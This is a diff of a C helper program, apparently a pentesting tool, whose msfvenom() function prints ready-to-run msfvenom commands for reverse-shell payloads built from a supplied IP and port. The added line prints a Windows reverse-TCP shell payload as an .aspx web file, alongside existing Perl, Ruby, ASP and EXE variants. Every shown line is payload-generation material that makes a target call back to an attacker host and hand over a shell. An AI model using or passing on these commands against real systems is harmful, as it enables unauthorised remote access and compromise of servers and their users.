@@ -123,6 +123,7 @@ void msfvenom(char *ip, char *port) {
 	printf("msfvenom -p cmd/windows/reverse_perl LHOST=%s LPORT=%s -f perl -o shell.pl\n",ip,port);
 	printf("msfvenom -p ruby/shell_reverse_tcp LHOST=%s LPORT=%s -f ruby -o shell.rb\n",ip,port);
 	printf("msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s -f asp -o shell.asp\n",ip,port);
+	printf("msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s -f aspx -o shell.aspx\n",ip,port);
 	printf("msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s -f exe -o shell.exe\n",ip,port);
 	printf("msfvenom -p windows/x64/powershell_reverse_tcp LHOST=%s LPORT=%s -f exe -o shell.exe\n",ip,port);
 	printf("msfvenom -p windows/x64/shell_reverse_tcp LHOST=%s LPORT=%s -f exe -o shell.exe\n",ip,port);
